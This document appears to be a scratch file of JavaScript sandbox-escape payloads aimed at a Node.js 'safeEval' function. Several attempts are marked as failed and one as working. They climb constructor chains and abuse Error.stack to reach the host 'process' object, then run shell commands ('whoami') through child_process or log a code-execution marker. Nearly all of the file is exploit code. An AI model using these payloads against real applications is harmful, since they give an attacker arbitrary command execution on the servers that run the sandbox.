// fail
const code = '(' + function (){
    delete this.constructor;
    const HostObject = this.constructor;
    const HostFunction = HostObject.is.constructor;
    const process = HostFunction('return process')();
    return process.mainModule.require('child_process').execSync('whoami').toString();
} + ')()';

// minified
// fail
const code = '(' + function (){delete this.constructor;const HostObject = this.constructor;const HostFunction = HostObject.is.constructor;const process = HostFunction('return process')();return process.mainModule.require('child_process').execSync('whoami').toString();} + ')()';


//fail
const theFunction = function() { const bad = new Error(); bad.proto = null; bad.stack = { match(outer) { throw outer.constructor.constructor('return process')().mainModule.require('child_process').execSync('whoami').toString(); } }; return bad; };const untrusted = (${theFunction})();


//fail
const theFunction = function() {const bad = new Error();bad.__proto__ = null;bad.stack = {match(outer) {throw outer.constructor.constructor("return process")().mainModule.require('child_process').execSync('whoami').toString();}};return bad;};const untrusted = `(${theFunction})()`;


// fail - this was not defined
var process = this.constructor.constructor('return (function(){return process})()')();var require = process.mainModule.require;

// working
// since this was not defined we used ref which we know from looking at the source code is one of the variables passed to safeEval
var process = ref.constructor.constructor('return (function(){return process})()')();var require = process.mainModule.require;require('util').log('CODE EXECUTION12123')